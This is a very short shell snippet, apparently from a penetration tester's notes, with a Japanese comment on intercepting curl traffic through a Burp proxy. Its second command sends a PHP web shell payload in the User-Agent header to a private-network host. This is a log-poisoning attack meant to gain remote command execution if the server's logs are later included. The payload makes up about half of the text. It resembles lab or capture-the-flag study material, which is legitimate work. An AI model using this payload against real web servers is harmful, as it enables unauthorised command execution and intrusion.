```sh
# curlでのリクエストをburpでinterceptする
curl http://192.168.1.1/example --proxy 127.0.0.1:8080

curl http://192.168.1.1/example --user-agent <?php echo system($_GET['cmd']); ?>
```